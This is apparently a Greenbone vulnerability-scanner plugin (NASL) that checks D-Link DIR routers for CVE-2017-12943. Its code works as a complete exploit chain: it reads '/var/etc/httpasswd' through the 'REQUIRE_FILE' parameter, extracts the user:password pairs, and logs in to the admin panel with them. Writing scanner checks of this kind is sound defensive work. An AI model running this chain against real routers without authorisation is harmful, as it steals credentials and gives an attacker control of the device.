# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103858");
  script_version("2025-07-02T05:41:52+0000");
  script_tag(name:"last_modification", value:"2025-07-02 05:41:52 +0000 (Wed, 02 Jul 2025)");
  script_tag(name:"creation_date", value:"2013-12-16 14:34:55 +0100 (Mon, 16 Dec 2013)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2023-11-08 20:20:00 +0000 (Wed, 08 Nov 2023)");

  script_cve_id("CVE-2017-12943");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Multiple D-Link DIR Series Routers 'model/__show_info.php' Local File Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  # nb: Experiences in the past have shown that various different devices could be affected
  script_dependencies("gb_dlink_dsl_consolidation.nasl", "gb_dlink_dap_consolidation.nasl",
                      "gb_dlink_dir_consolidation.nasl", "gb_dlink_dwr_consolidation.nasl");
  script_mandatory_keys("d-link/http/detected");
  script_require_ports("Services/www", 80, 8080);

  script_tag(name:"summary", value:"Multiple D-Link DIR series routers are prone to a local file
  disclosure vulnerability because the routers fails to adequately validate user-supplied input.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request which tries to read
  '/var/etc/httpasswd'");

  script_tag(name:"insight", value:"The remote D-Link device fails to adequately validate user
  supplied input to 'REQUIRE_FILE' in '__show_info.php'");

  script_tag(name:"impact", value:"Exploiting this vulnerability would allow an attacker to obtain
  potentially sensitive information from local files on devices running the vulnerable application.
  This may aid in further attacks.");

  script_tag(name:"affected", value:"DIR-615 / DIR-300 / DIR-600.

  Other devices and models might be affected as well.");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64043");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/42581");

  exit(0);
}

CPE_PREFIX = "cpe:/o:dlink";

include("host_details.inc");
include("http_func.inc");

if(!infos = get_app_port_from_cpe_prefix(cpe:CPE_PREFIX, service:"www"))
  exit(0);

port = infos["port"];
CPE = infos["cpe"];

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req);

if(buf !~ "^HTTP/1\.[01] 200" || "<center>" >!< buf)
  exit(99);

creds = eregmatch(pattern:'<center>.*([a-zA-Z0-9]+:[a-zA-Z0-9]+)[^a-zA-Z0-9]*</center>', string:buf);

lines = split(buf);
x = 0;

foreach line (lines) {

  x++;
  if("<center>" >< line) {

    for(i=x; i < max_index(lines); i++) {

      if("</center>" >< lines[i])break;
      user_pass = eregmatch(pattern:"([a-zA-Z0-9]+:[a-zA-Z0-9]+)", string:lines[i]);
      if(!isnull(user_pass[1])) {
        ul[p++] = chomp(user_pass[1]);
        continue;
      }
    }
  }
}

if(max_index(ul) < 1)
  exit(99);

url2 = dir + '/tools_admin.php';
req = http_get(item:url2, port:port);
buf = http_send_recv(port:port, data:req);

if("LOGIN_USER" >!< buf)
  exit(0);

foreach p (ul) {

  u = split(p, sep:":", keep:FALSE);

  if(isnull(u[0]))
    continue;

  user = u[0];
  pass = u[1];

  url2 = dir + '/login.php';
  login_data = 'ACTION_POST=LOGIN&LOGIN_USER=' + user  + '&LOGIN_PASSWD=' + pass;
  req = http_post(item:url2, port:port, data:login_data);
  buf = http_send_recv(port:port, data:req);

  if(buf !~ "^HTTP/1\.[01] 200")
    continue;

  url2 = dir + '/tools_admin.php';
  req = http_get(item:url2, port:port);
  buf = http_send_recv(port:port, data:req);

  if("OPERATOR PASSWORD" >< buf && "ADMIN PASSWORD" >< buf) {
    url2 = "/logout.php";
    req = http_get(item:url2, port:port);
    http_send_recv(port:port, data:req); # clear ip based auth
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
